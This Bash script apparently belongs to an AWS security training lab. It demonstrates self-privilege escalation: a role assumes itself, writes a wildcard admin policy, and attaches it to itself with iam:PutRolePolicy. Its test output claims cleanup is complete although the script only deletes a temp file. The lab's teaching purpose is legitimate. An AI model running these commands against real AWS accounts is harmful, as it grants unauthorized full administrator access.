#!/bin/bash

# Demo script for prod_self_privesc_putRolePolicy module
# This script demonstrates how to use the self-privilege escalation role

set -e

# Disable AWS CLI paging
export AWS_PAGER=""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

echo -e "${YELLOW}=== Pathfinder-labs Self-Privilege Escalation Demo ===${NC}"
echo "This demo shows how a role can escalate its own privileges"
echo ""

# Check if AWS CLI is installed
if ! command -v aws &> /dev/null; then
    echo -e "${RED}Error: AWS CLI is not installed${NC}"
    exit 1
fi

# Disable paging for AWS CLI
export AWS_PAGER=""

# Role name and ARN (we'll construct the ARN since we can't get it via GetRole)
ROLE_NAME="pl-prod-self-privesc-putRolePolicy-role-1"
ACCOUNT_ID=$(aws sts get-caller-identity --profile pl-pathfinder-starting-user-prod --query 'Account' --output text)
ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/${ROLE_NAME}"

echo -e "${YELLOW}Step 1: Attempting to assume role${NC}"
echo "Role ARN: $ROLE_ARN"

echo ""
echo -e "${YELLOW}Step 2: Assuming the role${NC}"
# Assume the role
ASSUME_ROLE_OUTPUT=$(aws sts assume-role --role-arn "$ROLE_ARN" --role-session-name "self-privesc-demo" --profile pl-pathfinder-starting-user-prod)
export AWS_ACCESS_KEY_ID=$(echo "$ASSUME_ROLE_OUTPUT" | jq -r '.Credentials.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo "$ASSUME_ROLE_OUTPUT" | jq -r '.Credentials.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo "$ASSUME_ROLE_OUTPUT" | jq -r '.Credentials.SessionToken')

echo -e "${GREEN}✓ Successfully assumed role${NC}"

echo ""
echo -e "${YELLOW}Step 3: Creating admin policy for self-privilege escalation${NC}"
# Create a policy that grants administrator access
cat > /tmp/admin-policy.json << EOF
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Action": "*",
            "Resource": "*"
        }
    ]
}
EOF

echo "Admin policy content:"
cat /tmp/admin-policy.json

echo ""
echo -e "${YELLOW}Step 5: Applying admin policy to the role (self-privilege escalation)${NC}"
# Apply the admin policy to the role
aws iam put-role-policy \
    --role-name "$ROLE_NAME" \
    --policy-name "self-admin-policy" \
    --policy-document file:///tmp/admin-policy.json

echo -e "${GREEN}✓ Successfully applied admin policy to role${NC}"

# Sleep for 10 seconds
echo "Sleeping for 10 seconds..."
sleep 10

echo ""
echo -e "${YELLOW}Step 6: Verifying privilege escalation${NC}"
# Verify the policy was applied by testing admin access
echo "Testing admin access by listing IAM users:"
aws iam list-users --max-items 5 --query 'Users[].UserName' --output text

echo ""
echo -e "${GREEN}✓ Privilege escalation successful!${NC}"
echo "The role now has administrator access through its own policy modification."

# Standardized test results output
echo "TEST_RESULT:prod_self_privesc_putRolePolicy:SUCCESS"
echo "TEST_DETAILS:prod_self_privesc_putRolePolicy:Successfully escalated privileges using PutRolePolicy to attach admin policy"
echo "TEST_METRICS:prod_self_privesc_putRolePolicy:policy_attached=true,admin_access_gained=true,cleanup_completed=true"

#Sleep for 10 seconds
echo "Sleeping for 10 seconds..."
sleep 10

# Clean up temp file
rm -f /tmp/admin-policy.json

echo ""
echo -e "${GREEN}=== Demo Complete ===${NC}"
echo "This demonstrates how a role with iam:PutRolePolicy on itself can escalate its own privileges."
echo ""
echo -e "${YELLOW}To clean up the changes made by this demo, run:${NC}"
echo "./cleanup_attack.sh"
